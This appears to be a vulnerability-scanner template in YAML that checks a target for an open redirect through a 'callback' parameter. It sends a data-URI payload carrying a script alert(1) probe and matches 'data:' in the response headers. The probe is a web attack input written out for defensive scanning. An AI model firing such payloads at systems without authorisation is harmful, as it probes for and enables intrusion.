id: redirect2-010
name: 'Open redirect2 via callback'
severity: medium
type: active
tags:
  - redirect
  - open-redirect
description: 'Unsafe redirect via callback'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      callback:
        - 'data:text/html,<script>alert(1)</script>'
    matchers:
      - type: word
        part: headers
        words:
          - 'data:'
